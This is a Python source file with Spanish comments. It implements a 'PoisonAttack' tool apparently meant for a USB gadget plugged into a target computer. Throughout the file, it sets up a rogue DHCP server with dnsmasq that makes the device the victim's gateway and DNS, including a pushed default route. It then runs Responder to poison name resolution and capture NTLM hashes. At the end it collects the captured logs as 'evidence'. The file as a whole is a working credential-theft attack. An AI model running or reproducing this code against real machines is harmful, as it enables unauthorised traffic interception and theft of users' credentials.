# poison_logic.py (reemplazar completamente)
import os
import subprocess
import time
import re
import threading
import glob

class PoisonAttack:
    def __init__(self, interface=None, callback_consola=None, session_dir=None):
        """
        interface: si es None, se detecta automáticamente la interfaz USB gadget.
        """
        self.interface = interface or self._detectar_interfaz_gadget()
        self.callback = callback_consola
        self.session_dir = session_dir
        self.stop_event = threading.Event()
        self.dns_proc = None
        self.proc_responder = None

    def log(self, texto):
        texto_limpio = re.sub(r'\x1b\[[0-9;]*m', '', texto)
        for simbolo in ['¤', '[0m', '[1;32m', '[1;34m', '[0;33m']:
            texto_limpio = texto_limpio.replace(simbolo, '')
        if self.callback:
            self.callback(f"{texto_limpio}")
        else:
            print(texto_limpio)

    def _detectar_interfaz_gadget(self):
        """Busca la primera interfaz de red que tenga dirección MAC de gadget USB."""
        try:
            # Las interfaces gadget suelen tener nombres como enx... o usb0
            for iface in os.listdir('/sys/class/net/'):
                if iface == 'lo':
                    continue
                # Leer el tipo de interfaz (para gadget suele ser 1 o 772)
                type_path = f'/sys/class/net/{iface}/type'
                if os.path.exists(type_path):
                    with open(type_path) as f:
                        iface_type = f.read().strip()
                    if iface_type == '772' or iface.startswith('usb') or iface.startswith('enx'):
                        # Verificamos que tenga dirección MAC (gadget activo)
                        if os.path.exists(f'/sys/class/net/{iface}/address'):
                            return iface
            # Fallback: si existe usb0, lo usamos
            if os.path.exists('/sys/class/net/usb0'):
                return 'usb0'
        except Exception:
            pass
        return 'usb0'  # último recurso

    def _limpiar_procesos_previos(self):
        """Mata cualquier instancia anterior de dnsmasq/responder en nuestra interfaz."""
        os.system("sudo pkill -f dnsmasq > /dev/null 2>&1")
        os.system("sudo pkill -f responder > /dev/null 2>&1")
        os.system(f"sudo fuser -k 53/udp > /dev/null 2>&1")
        os.system(f"sudo fuser -k 67/udp > /dev/null 2>&1")
        time.sleep(1)

    def start(self):
        """Lanza el ataque y bloquea hasta que se detenga o termine."""
        self._limpiar_procesos_previos()
        iface = self.interface

        self.log(f"\n[!] DRAGON FLY SYSTEM")
        self.log(f"[*] Configurando interfaz: {iface}")

        try:
            # Desvincular de NetworkManager
            self.log("[*] Desvinculando interfaz de NetworkManager...")
            os.system(f"sudo nmcli device set {iface} managed no > /dev/null 2>&1")

            self.log("[*] Levantando interfaz de red...")
            os.system(f"sudo ip link set {iface} up")
            time.sleep(3)

            # Asignación de IP estática
            os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.disable_ipv6=1 > /dev/null 2>&1")
            self.log(f"[*] Asignando IP estática local a {iface}...")
            os.system(f"sudo ip addr flush dev {iface}")
            os.system(f"sudo ip addr add 1.0.0.1/8 dev {iface}")

            # Rutas
            self.log("[*] Inyectando rutas estáticas...")
            os.system(f"sudo ip route add 1.0.0.0/8 dev {iface} 2>/dev/null")
            os.system(f"sudo ip route add 224.0.0.0/4 dev {iface} 2>/dev/null")
            os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null")

            # Configurar dnsmasq (DHCP)
            config_dhcp = (
                f"interface={iface}\n"
                f"dhcp-range=1.0.0.10,1.0.0.250,255.0.0.0,12h\n"
                f"dhcp-option=3,1.0.0.1\n"
                f"dhcp-option=6,1.0.0.1\n"
                f"dhcp-option=121,0.0.0.0/0,1.0.0.1\n"
                f"bind-interfaces\n"
            )
            with open("dnsmasq_temp.conf", "w") as f:
                f.write(config_dhcp)

            self.log("[*] Lanzando servidor DHCP (dnsmasq)...")
            self.dns_proc = subprocess.Popen(
                ["sudo", "dnsmasq", "-C", "dnsmasq_temp.conf", "-d"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            time.sleep(2)

            # Buscar el binario de Responder
            if os.path.exists("/usr/share/responder/Responder.py"):
                comando = ["sudo", "python3", "/usr/share/responder/Responder.py", "-I", iface, "-wvF"]
            elif os.path.exists("/opt/Responder/Responder.py"):
                comando = ["sudo", "python3", "/opt/Responder/Responder.py", "-I", iface, "-wvF"]
            else:
                comando = ["sudo", "responder", "-I", iface, "-wvF"]

            self.log(f"[+] INTERFAZ LISTA: {iface}")
            self.log(f"[+] OBJETIVO: Captura de tráfico y hashes NTLM")

            self.proc_responder = subprocess.Popen(
                comando,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )

            # Bucle de lectura que respeta el evento de parada
            while not self.stop_event.is_set():
                linea = self.proc_responder.stdout.readline()
                if not linea and self.proc_responder.poll() is not None:
                    break
                if linea:
                    self.log(linea.strip())

        except Exception as e:
            self.log(f"\n[!] Error crítico: {e}")
        finally:
            self._cleanup()

    def _cleanup(self):
        """Detiene procesos, restaura red y guarda logs."""
        self.log("\n[*] Deteniendo procesos y restaurando red...")
        if self.dns_proc:
            try:
                self.dns_proc.terminate()
                self.dns_proc.wait(timeout=3)
            except:
                self.dns_proc.kill()
            self.dns_proc = None

        if self.proc_responder:
            try:
                self.proc_responder.terminate()
                self.proc_responder.wait(timeout=3)
            except:
                self.proc_responder.kill()
            self.proc_responder = None

        os.system("sudo pkill -f responder > /dev/null 2>&1")
        os.system("sudo pkill -f dnsmasq > /dev/null 2>&1")
        os.system("sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null")
        os.system(f"sudo ip addr flush dev {self.interface} > /dev/null 2>&1")
        if os.path.exists("dnsmasq_temp.conf"):
            os.remove("dnsmasq_temp.conf")

        # Guardado de logs de Responder en la carpeta de sesión
        if self.session_dir:
            self.log(f"[*] Organizando evidencia en: {os.path.basename(self.session_dir)}")
            os.makedirs(self.session_dir, exist_ok=True)

            # Mover logs de Responder (si existen)
            for log_dir in ["/usr/share/responder/logs", "/opt/Responder/logs"]:
                if os.path.isdir(log_dir):
                    for f in glob.glob(os.path.join(log_dir, "*")):
                        try:
                            os.rename(f, os.path.join(self.session_dir, os.path.basename(f)))
                        except:
                            subprocess.run(["sudo", "mv", f, self.session_dir], stderr=subprocess.DEVNULL)

            # Asegurar permisos
            subprocess.run(["sudo", "chmod", "-R", "777", self.session_dir], stderr=subprocess.DEVNULL)

        self.log("[+] Sistema restaurado. ¡Cacería finalizada!")

    def stop(self):
        """Ordena detener el ataque desde fuera del hilo."""
        self.stop_event.set()
        if self.proc_responder:
            try:
                self.proc_responder.terminate()
            except:
                pass
        if self.dns_proc:
            try:
                self.dns_proc.terminate()
            except:
                pass
